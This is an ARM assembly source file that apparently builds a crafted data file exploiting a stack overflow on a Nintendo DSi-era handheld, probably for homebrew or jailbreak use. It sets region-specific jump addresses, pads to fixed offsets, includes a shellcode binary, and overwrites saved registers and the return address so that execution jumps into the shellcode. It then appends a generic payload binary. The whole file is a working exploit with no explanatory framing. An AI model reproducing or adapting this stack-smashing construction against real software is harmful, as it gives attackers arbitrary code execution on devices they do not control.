.arch armv5te
.fpu softvfp
.eabi_attribute 23, 1
.eabi_attribute 24, 1
.eabi_attribute 25, 1
.eabi_attribute 26, 1
.eabi_attribute 30, 2
.eabi_attribute 18, 4

.global _start
.section .init

#define REGION_USA 45
#define REGION_EUR 56

#define FORMATSTRADR 0x020bc898
#define SHELLCODE_CPYADR 0x02500408
#define STACK_SHELLCODE_ADR 0x02fe3604

#if REGCODE==REGION_USA

#define JUMPADR 0x02040e08

#elif REGCODE==REGION_EUR

#define JUMPADR 0x02040e38

#else
//#error "Unsupported region."
#endif

_start:
.incbin "header.bin"

.space (_start + 0x6a + 0x28) - .

.incbin "shellcode.bin"

@.space (_start + 0x18a + 0x28 - 0x20) - . @ {r4, r5, r6, r7, r8, r9, sl, fp, lr}
.space (_start + 0x49e + 0x100 - 0x10 + 0x44 - 0x08) - .
.word FORMATSTRADR @r4
.word SHELLCODE_CPYADR - 0x04 @r5
.word -0x5A @r6 record index, since we can't use zeros in this stack-smash index.
.word JUMPADR @r7
.word JUMPADR @r8
.word JUMPADR @r9
.word JUMPADR @sl
.word JUMPADR @fp
.word JUMPADR @lr

@L_2040de0 stackframe: {r3, r4, r5, r6, r7, lr}
.word JUMPADR @r3
.word JUMPADR @r4
.word JUMPADR @r5
.word JUMPADR @r6
.word JUMPADR @r7
.word SHELLCODE_CPYADR @lr

.space (_start + 0x1e2) - .

.space (_start + 0x2bfc) - .

.incbin "../generictwlpayload/generictwlpayload.bin"

.space (_start + 0x10000) - .

